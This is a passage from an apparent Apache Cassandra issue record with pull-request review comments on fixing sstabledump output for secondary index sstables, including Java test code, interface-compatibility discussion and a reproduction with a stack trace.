+        String createIndex = ""CREATE INDEX ON %s (k)"";
+        String insert = ""INSERT INTO %s (k, v) VALUES (0, 0)"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }

Review Comment:
   This block of code is repeated verbatim 8 times in this file. I would encapsulate it into a method so the 8 tests using it can be one-liners. That should save us more that one hundred lines of duplicated code:
   ```java
   @Test
   public void testCollectionSetIndex() throws Throwable
   {
       testIndex(""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"",
                 ""CREATE INDEX ON %s (st)"", 
                 ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"");
   }
   
   private void testIndex(String createTable, String createIndex, String insert) throws Throwable
   {
       Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
       ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
       assertTrue(cfs.indexManager.hasIndexes());
       assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
   
       for (ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
       {
           assertTrue(columnFamilyStore.isIndex());
           for (SSTableReader sst : columnFamilyStore.getLiveSSTables())
           {
               String file = sst.getFilename();
               ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
               List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
               assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
               assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
           }
       }
   }
   ```



##########
src/java/org/apache/cassandra/dht/RandomPartitioner.java:
##########
@@ -342,9 +342,9 @@ public AbstractType<?> getTokenValidator()
         return IntegerType.instance;
     }
 
-    public AbstractType<?> partitionOrdering()
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType)
     {
-        return partitionOrdering;
+        return ((PartitionerDefinedOrder)partitionOrdering).withBaseType(baseType);

Review Comment:
   `RandomPartitioner#partitionOrdering` can be declared with type `PartitionerDefinedOrder`, so we don't need to cast here.



;01/Feb/23 18:05;githubbot;600","adelapena commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093585505


##########
src/java/org/apache/cassandra/dht/IPartitioner.java:
##########
@@ -128,8 +128,9 @@ default Token getMaximumToken()
     /**
      * Abstract type that orders the same way as DecoratedKeys provided by this partitioner.
      * Used by secondary indices.
+     * @param baseType base type for PartitionerDefinedOrder
      */
-    public AbstractType<?> partitionOrdering();
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType);

Review Comment:
   I'm not sure whether the partitioner can be considered a public API, given that one can supply a custom class. If this is so I understand that we should get consensus on the mail list to change its API, even in a major (and I think we are officially in 4.2).
   
   A workaround to keep the API compatibility, if needed, would be providing a default implementation of the new `partitionOrdering(AbstractType)`, and keeping the previous `partitionOrdering()` method.
   
   @blambov wdyt?



;01/Feb/23 18:26;githubbot;600","blambov commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093587398


##########
src/java/org/apache/cassandra/dht/IPartitioner.java:
##########
@@ -128,8 +128,9 @@ default Token getMaximumToken()
     /**
      * Abstract type that orders the same way as DecoratedKeys provided by this partitioner.
      * Used by secondary indices.
+     * @param baseType base type for PartitionerDefinedOrder
      */
-    public AbstractType<?> partitionOrdering();
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType);

Review Comment:
   >  A workaround to keep the API compatibility, if needed, would be providing a default implementation of the new `partitionOrdering(AbstractType)`, and keeping the previous `partitionOrdering()` method.
   
   This works for me. Would it need mailing list agreement too?



;01/Feb/23 18:28;githubbot;600","adelapena commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093597111


##########
src/java/org/apache/cassandra/dht/IPartitioner.java:
##########
@@ -128,8 +128,9 @@ default Token getMaximumToken()
     /**
      * Abstract type that orders the same way as DecoratedKeys provided by this partitioner.
      * Used by secondary indices.
+     * @param baseType base type for PartitionerDefinedOrder
      */
-    public AbstractType<?> partitionOrdering();
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType);

Review Comment:
   I think it wouldn't, since we wouldn't be breaking any public API compatibility. For context on the discussions about releasing 5.0 and API changes, see:
   
   - https://www.mail-archive.com/dev@cassandra.apache.org/msg19516.html
   - https://www.mail-archive.com/dev@cassandra.apache.org/msg19925.html
   - https://issues.apache.org/jira/browse/CASSANDRA-17973



;01/Feb/23 18:39;githubbot;600","adelapena commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093617160


##########
src/java/org/apache/cassandra/dht/IPartitioner.java:
##########
@@ -128,8 +128,9 @@ default Token getMaximumToken()
     /**
      * Abstract type that orders the same way as DecoratedKeys provided by this partitioner.
      * Used by secondary indices.
+     * @param baseType base type for PartitionerDefinedOrder
      */
-    public AbstractType<?> partitionOrdering();
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType);

Review Comment:
   That's what I mean with the workaround:
   ```java
   @Deprecated // use #partitionOrdering(AbstractType) instead, see CASSANDRA-17698 for details
   AbstractType<?> partitionOrdering();
   
   default AbstractType<?> partitionOrdering(@Nullable AbstractType<?> partitionKeyType)
   {
       return partitionOrdering();
   }
   ```
   And then the proper partitioner implementations can override `partitionOrdering(AbstractType)`.



;01/Feb/23 19:00;githubbot;600","Maxwell-Guo commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093941047


##########
src/java/org/apache/cassandra/dht/Murmur3Partitioner.java:
##########
@@ -416,9 +416,9 @@ public Token getMaximumToken()
         return new LongToken(Long.MAX_VALUE);
     }
 
-    public AbstractType<?> partitionOrdering()
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType)
     {
-        return partitionOrdering;
+        return ((PartitionerDefinedOrder)partitionOrdering).withBaseType(baseType);

Review Comment:
   you are right



;02/Feb/23 02:18;githubbot;600","Maxwell-Guo commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093956238


##########
src/java/org/apache/cassandra/dht/IPartitioner.java:
##########
@@ -128,8 +128,9 @@ default Token getMaximumToken()
     /**
      * Abstract type that orders the same way as DecoratedKeys provided by this partitioner.
      * Used by secondary indices.
+     * @param baseType base type for PartitionerDefinedOrder
      */
-    public AbstractType<?> partitionOrdering();
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType);

Review Comment:
   ok 



;02/Feb/23 02:48;githubbot;600","Maxwell-Guo commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093959626


##########
src/java/org/apache/cassandra/dht/IPartitioner.java:
##########
@@ -128,8 +128,9 @@ default Token getMaximumToken()
     /**
      * Abstract type that orders the same way as DecoratedKeys provided by this partitioner.
      * Used by secondary indices.
+     * @param baseType base type for PartitionerDefinedOrder
      */
-    public AbstractType<?> partitionOrdering();
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType);

Review Comment:
   AbstractType<?> partitionOrdering();
   I will just mark this method Deprecated and left the comment, but I will not remove the public flag of the method , though the public is useless.



;02/Feb/23 02:55;githubbot;600","adelapena commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1094352981


##########
src/java/org/apache/cassandra/dht/ByteOrderedPartitioner.java:
##########
@@ -17,6 +17,7 @@
  */
 package org.apache.cassandra.dht;
 
+import org.apache.cassandra.db.marshal.UTF8Type;

Review Comment:
   Unneeded change, it breaks the build.



;02/Feb/23 10:46;githubbot;600","adelapena commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1229888532


##########
test/unit/org/apache/cassandra/cql3/SecondaryIndexSSTableExportTest.java:
##########
@@ -0,0 +1,181 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.cql3;
+
+
+import java.util.List;
+import java.util.Map;
+
+import org.apache.cassandra.config.DatabaseDescriptor;
+import org.apache.cassandra.tools.SSTableExport;
+import org.apache.cassandra.tools.ToolRunner;
+import org.apache.cassandra.utils.Pair;
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import com.fasterxml.jackson.core.type.TypeReference;
+import org.apache.cassandra.db.ColumnFamilyStore;
+import org.apache.cassandra.io.sstable.format.SSTableReader;
+import org.apache.cassandra.utils.JsonUtils;
+
+import static org.apache.cassandra.config.CassandraRelevantProperties.TEST_UTIL_ALLOW_TOOL_REINIT_FOR_TEST;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertFalse;
+import static org.junit.Assert.assertNotNull;
+import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.fail;
+
+public class SecondaryIndexSSTableExportTest extends CQLTester
+{
+    private static final TypeReference<List<Map<String, Object>>> jacksonListOfMapsType = new TypeReference<List<Map<String, Object>>>() {};
+    private static boolean initValue;
+
+    @BeforeClass
+    public static void beforeClass()
+    {
+        initValue = TEST_UTIL_ALLOW_TOOL_REINIT_FOR_TEST.getBoolean();
+        TEST_UTIL_ALLOW_TOOL_REINIT_FOR_TEST.setBoolean(true);
+    }
+
+    @AfterClass
+    public static void afterClass()
+    {
+        TEST_UTIL_ALLOW_TOOL_REINIT_FOR_TEST.setBoolean(initValue);
+    }
+
+    @Test
+    public void testRegularColumnIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int PRIMARY KEY, v int)"";
+        String createIndex = ""CREATE INDEX ON %s (v)"";
+        String insert = ""INSERT INTO %s (k, v) VALUES (0, 0)"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testPartitionKeyIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int, v int, c text, primary key((k, v)))"";
+        String createIndex = ""CREATE INDEX ON %s (k)"";
+        String insert = ""INSERT INTO %s (k, v) VALUES (0, 0)"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testKeysWithStaticIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, primary key(k, v))"";
+        String createIndex = ""CREATE INDEX ON %s (v)"";
+        String insert = ""INSERT INTO %s (k, v, s) VALUES (0, 0, 's')"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testClusteringIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (c)"";
+        String insert = ""INSERT INTO %s (k, v, s, c) VALUES (0, 0, 's', 10)"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testCollectionMapKeyIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (KEYS(m))"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testCollectionMapValueIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (VALUES(m))"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testCollectionListIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (l)"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testCollectionSetIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (st)"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    private void indexSstableValidation(String createTableCql, String createIndexCql, String insertCql) throws Throwable
+    {
+        String SUCEESS_MSG = ""Test passed"";
+        try
+        {
+            Pair<String, String> tableIndex = generateSstable(createTableCql, createIndexCql, insertCql);
+            ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+            assertTrue(cfs.indexManager.hasIndexes());
+            assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+            for (ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+            {
+                assertTrue(columnFamilyStore.isIndex());
+                assertFalse(columnFamilyStore.getLiveSSTables().isEmpty());
+                for (SSTableReader sst : columnFamilyStore.getLiveSSTables())
+                {
+                    String file = sst.getFilename();
+                    ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                    List<Map<String, Object>> parsed = JsonUtils.JSON_OBJECT_MAPPER.readValue(tool.getStdout(), jacksonListOfMapsType);
+                    assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                    assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+                }
+            }
+            fail(SUCEESS_MSG);
+        }
+        catch (Throwable throwable)
+        {
+            // UPGRADING or NONE
+            if (DatabaseDescriptor.getStorageCompatibilityMode().isAfter(5))
+            {
+                assertEquals(SUCEESS_MSG, throwable.getMessage());
+            }
+            else
+            {
+                System.out.println(throwable.getMessage());

Review Comment:
   I think we can check that we are actually throwing the expected message, and mentioning CASSANDRA-18254 since we are not entirely fixing the bug:
   ```java
   Pair<String, String> tableIndex = generateSstable(createTableCql, createIndexCql, insertCql);
   ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
   assertTrue(cfs.indexManager.hasIndexes());
   assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
   for (ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
   {
       assertTrue(columnFamilyStore.isIndex());
       assertFalse(columnFamilyStore.getLiveSSTables().isEmpty());
       for (SSTableReader sst : columnFamilyStore.getLiveSSTables())
       {
           String file = sst.getFilename();
           try
           {
               ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
               List<Map<String, Object>> parsed = JsonUtils.JSON_OBJECT_MAPPER.readValue(tool.getStdout(), jacksonListOfMapsType);
               assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
               assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
           }
           catch (AssertionError e)
           {
               // TODO: CASSANDRA-18254 should provide a workaround for pre-5.0 sstables
               assertTrue(DatabaseDescriptor.getStorageCompatibilityMode().isBefore(5));
               Assertions.assertThat(e.getMessage())
                         .contains(""PartitionerDefinedOrder's toJSONString method needs a partition key type but now is null."");
           }
           catch (MismatchedInputException e)
           {
               // TODO: CASSANDRA-18254 should provide a workaround for pre-5.0 sstables
               assertTrue(DatabaseDescriptor.getStorageCompatibilityMode().isBefore(5));
               Assertions.assertThat(e.getMessage())
                         .contains(""No content to map due to end-of-input"");
           }
       }
   }
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -138,6 +147,33 @@ public TypeSerializer<ByteBuffer> getSerializer()
     @Override
     public String toString()
     {
+        if (DatabaseDescriptor.getStorageCompatibilityMode().isAfter(5) &&

Review Comment:
   We have to assume that in the future there will be a `StorageCompatibilityMode.CASSANDRA_5(5)`. Its meaning will be ""We are in Cassandra 6.x, but we remain compatible with Cassandra 5.x"". That is, we will require to use the ""o*"" format introduced by 5.0 instead of whatever fancy new format we use in 6.0.
   
   In case of using that future CASSANDRA_5 compatibility mode, we should use the current fix. However, the current `DatabaseDescriptor.getStorageCompatibilityMode().isAfter(5)` will return false, and we will keep using the old 4.x behaviour in 6.x compatible with 5.x, which seems incorrect. 
   
   So I think that here we should just use  `!DatabaseDescriptor.getStorageCompatibilityMode().isBefore(5)` to select the new behaviour. Or we can use `DatabaseDescriptor.getStorageCompatibilityMode().isBefore(5)` to select the old behaviour if you want to avoid the negation, whatever you prefer.
   
   Also, although it's not strictly necessary, I would put the check for `partitionKeyType` before the compatibility check. That's because the compatibility check might have some increased performance cost in the future, whereas the null check is obviously trivial.
   
   So I would use something like:
   ```java
   @Override
       public String toString()
       {
           if (partitionKeyType != null && !DatabaseDescriptor.getStorageCompatibilityMode().isBefore(5))
           {
               return String.format(""%s(%s:%s)"", getClass().getName(), partitioner.getClass().getName(), partitionKeyType);
           }
           // if Cassandra's major version is after 5, use the old behaviour
           return String.format(""%s(%s)"", getClass().getName(), partitioner.getClass().getName());
       }
   ```
   The same would apply for the checks on `SecondaryIndexSSTableExportTest` and `TypeParserTest`.
   



;14/Jun/23 16:28;githubbot;600","Maxwell-Guo commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1230335958


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -138,6 +147,33 @@ public TypeSerializer<ByteBuffer> getSerializer()
     @Override
     public String toString()
     {
+        if (DatabaseDescriptor.getStorageCompatibilityMode().isAfter(5) &&

Review Comment:
   ok, +1 on this.



;15/Jun/23 02:03;githubbot;600","Maxwell-Guo commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1230336089


##########
test/unit/org/apache/cassandra/cql3/SecondaryIndexSSTableExportTest.java:
##########
@@ -0,0 +1,181 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.cql3;
+
+
+import java.util.List;
+import java.util.Map;
+
+import org.apache.cassandra.config.DatabaseDescriptor;
+import org.apache.cassandra.tools.SSTableExport;
+import org.apache.cassandra.tools.ToolRunner;
+import org.apache.cassandra.utils.Pair;
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import com.fasterxml.jackson.core.type.TypeReference;
+import org.apache.cassandra.db.ColumnFamilyStore;
+import org.apache.cassandra.io.sstable.format.SSTableReader;
+import org.apache.cassandra.utils.JsonUtils;
+
+import static org.apache.cassandra.config.CassandraRelevantProperties.TEST_UTIL_ALLOW_TOOL_REINIT_FOR_TEST;
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertFalse;
+import static org.junit.Assert.assertNotNull;
+import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.fail;
+
+public class SecondaryIndexSSTableExportTest extends CQLTester
+{
+    private static final TypeReference<List<Map<String, Object>>> jacksonListOfMapsType = new TypeReference<List<Map<String, Object>>>() {};
+    private static boolean initValue;
+
+    @BeforeClass
+    public static void beforeClass()
+    {
+        initValue = TEST_UTIL_ALLOW_TOOL_REINIT_FOR_TEST.getBoolean();
+        TEST_UTIL_ALLOW_TOOL_REINIT_FOR_TEST.setBoolean(true);
+    }
+
+    @AfterClass
+    public static void afterClass()
+    {
+        TEST_UTIL_ALLOW_TOOL_REINIT_FOR_TEST.setBoolean(initValue);
+    }
+
+    @Test
+    public void testRegularColumnIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int PRIMARY KEY, v int)"";
+        String createIndex = ""CREATE INDEX ON %s (v)"";
+        String insert = ""INSERT INTO %s (k, v) VALUES (0, 0)"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testPartitionKeyIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int, v int, c text, primary key((k, v)))"";
+        String createIndex = ""CREATE INDEX ON %s (k)"";
+        String insert = ""INSERT INTO %s (k, v) VALUES (0, 0)"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testKeysWithStaticIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, primary key(k, v))"";
+        String createIndex = ""CREATE INDEX ON %s (v)"";
+        String insert = ""INSERT INTO %s (k, v, s) VALUES (0, 0, 's')"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testClusteringIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (c)"";
+        String insert = ""INSERT INTO %s (k, v, s, c) VALUES (0, 0, 's', 10)"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testCollectionMapKeyIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (KEYS(m))"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testCollectionMapValueIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (VALUES(m))"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testCollectionListIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (l)"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    @Test
+    public void testCollectionSetIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (st)"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        indexSstableValidation(createTable, createIndex, insert);
+    }
+
+    private void indexSstableValidation(String createTableCql, String createIndexCql, String insertCql) throws Throwable
+    {
+        String SUCEESS_MSG = ""Test passed"";
+        try
+        {
+            Pair<String, String> tableIndex = generateSstable(createTableCql, createIndexCql, insertCql);
+            ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+            assertTrue(cfs.indexManager.hasIndexes());
+            assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+            for (ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+            {
+                assertTrue(columnFamilyStore.isIndex());
+                assertFalse(columnFamilyStore.getLiveSSTables().isEmpty());
+                for (SSTableReader sst : columnFamilyStore.getLiveSSTables())
+                {
+                    String file = sst.getFilename();
+                    ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                    List<Map<String, Object>> parsed = JsonUtils.JSON_OBJECT_MAPPER.readValue(tool.getStdout(), jacksonListOfMapsType);
+                    assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                    assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+                }
+            }
+            fail(SUCEESS_MSG);
+        }
+        catch (Throwable throwable)
+        {
+            // UPGRADING or NONE
+            if (DatabaseDescriptor.getStorageCompatibilityMode().isAfter(5))
+            {
+                assertEquals(SUCEESS_MSG, throwable.getMessage());
+            }
+            else
+            {
+                System.out.println(throwable.getMessage());

Review Comment:
   ok



;15/Jun/23 02:03;githubbot;600",,0,47400,,,0,47400,,,CASSANDRA-17973,,CASSANDRA-18254,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,maxwellguo,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 19 13:01:07 UTC 2023,,,,,,,All,,,,"0|z13bxc:",9223372036854775807,,,,adelapena,blambov,,,Normal,,3.0.4,,https://github.com/apache/cassandra/commit/cc3e742c735daddc29d2fb90aac638c641463d39,,,,,,,,,ut ,,,,,"15/Jul/22 14:59;adelapena;[~smiklosovic] what version/branch were you using, with what partitioner? I think that for the sstable format it should be 4.0 or greater. I haven't been able to reproduce this with the provided steps in none of the 4.0/4.1/trunk branches.;;;","18/Jul/22 09:07;smiklosovic;Hi [~adelapena], for me it is happening on trunk.

I am starting Cassandra in IDEA, then in the console of IDEA I do

$ bin/cqlsh + commands as shown in description
$ bin/nodetool flush
$ tools/bin/sstabledump path_to_index_sstable in data/data/....

Partitioner is Murmur3Partitioner;;;","18/Jul/22 11:00;adelapena;I still cannot reproduce it with current trunk. Are you seeing this consistently, or only occasionally?;;;","18/Jul/22 11:33;smiklosovic;Yeah, consistently, I did ant realclean && ant artifacts and stuff to be sure I am on trunk and I run trunk's jar and so on. Interesting, I ll think what might be the cause.

""env | grep CASSANDRA"" in that shell I am trying it in is empty.

$ java -version
java version ""1.8.0_311""
Java(TM) SE Runtime Environment (build 1.8.0_311-b11)
Java HotSpot(TM) 64-Bit Server VM (build 25.311-b11, mixed mode);;;","18/Jul/22 14:09;brandon.williams;This reproduces on trunk for me too:
{code:java}
(venv) drift@focal1:~/cassandra$ bin/cqlsh
Connected to Test Cluster at 127.0.0.1:9042
[cqlsh 6.2.0 | Cassandra 4.2-SNAPSHOT | CQL spec 3.4.6 | Native protocol v5]
Use HELP for help.
cqlsh> CREATE KEYSPACE ks1 WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 1};
cqlsh> CREATE TABLE ks1.tb1 ( id text, name text, primary key (id));
cqlsh> CREATE INDEX IF NOT EXISTS ON ks1.tb1(name);
cqlsh> INSERT INTO ks1.tb1 (id, name ) VALUES ( '1', 'Joe');
cqlsh> 
(venv) drift@focal1:~/cassandra$ bin/nodetool flush
(venv) drift@focal1:~/cassandra$ ./tools/bin/sstabledump data/data/ks1/tb1-ed765fe006a211ed8214bd7cbb129cb6/.tb1_name_idx/nb-1-big-Data.db 
[
  {
    ""partition"" : {
      ""key"" : [ ""Joe"" ],
      ""position"" : 0
    },
    ""rows"" : [
      {
        ""type"" : ""row"",
        ""position"" : 17,
        ""clustering"" : [ ] } ] } ]Exception in thread ""main"" java.lang.UnsupportedOperationException
        at org.apache.cassandra.db.marshal.PartitionerDefinedOrder.toJSONString(PartitionerDefinedOrder.java:91)
        at org.apache.cassandra.db.marshal.AbstractType.toJSONString(AbstractType.java:192)
        at org.apache.cassandra.tools.JsonTransformer.serializeClustering(JsonTransformer.java:372)
        at org.apache.cassandra.tools.JsonTransformer.serializeRow(JsonTransformer.java:269)
        at org.apache.cassandra.tools.JsonTransformer.serializePartition(JsonTransformer.java:235)
        at java.util.stream.ForEachOps$ForEachOp$OfRef.accept(ForEachOps.java:183)
        at java.util.stream.ReferencePipeline$2$1.accept(ReferencePipeline.java:175)
        at java.util.Iterator.forEachRemaining(Iterator.java:116)
        at java.util.Spliterators$IteratorSpliterator.forEachRemaining(Spliterators.java:1801)
